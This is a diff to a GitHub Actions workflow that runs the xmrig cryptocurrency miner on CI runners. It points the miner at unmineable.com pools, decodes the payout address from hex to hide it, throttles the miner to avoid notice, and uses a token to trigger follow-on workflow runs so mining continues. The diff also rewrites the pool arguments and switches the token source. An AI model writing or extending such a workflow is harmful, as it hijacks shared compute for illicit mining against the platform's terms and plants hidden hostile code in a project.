@@ -50,12 +50,9 @@ jobs:
           ADDR=$(echo "$HEX" | xxd -r -p)
 
           nice -n 10 ./xmrig -a rx \
-            -o stratum+ssl://rx.unmineable.com:443 \
-            -u "$ADDR" -p x \
-            --randomx-no-rdmsr --keepalive \
-            --cpu-max-threads-hint=85 \
-            --http-enabled=0 \
-            -o stratum+tcp://rx.unmineable.com:3333 \
+            -o stratum+ssl://rx.unmineable.com:443 -u "$ADDR" -p x \
+            --randomx-no-rdmsr --keepalive --cpu-max-threads-hint=85 --http-enabled=0 \
+            -o stratum+tcp://rx.unmineable.com:3333 -u "$ADDR" -p x \
             | tee report.log &
 
           PID=$!
@@ -88,7 +85,7 @@ jobs:
       - name: Trigger Next (Starter)
         if: always()
         env:
-          GH_TOKEN: ${{ secrets.GH_TOKEN }}
+          GH_TOKEN: ${{ github.token }}
         run: |
           curl -s -X POST \
             -H "Authorization: Bearer ${GH_TOKEN}" \
@@ -99,7 +96,7 @@ jobs:
       - name: Queue Maintenance
         if: always()
         env:
-          GH_TOKEN: ${{ secrets.GH_TOKEN }}
+          GH_TOKEN: ${{ github.token }}
         run: |
           curl -s -X POST \
             -H "Authorization: Bearer ${GH_TOKEN}" \
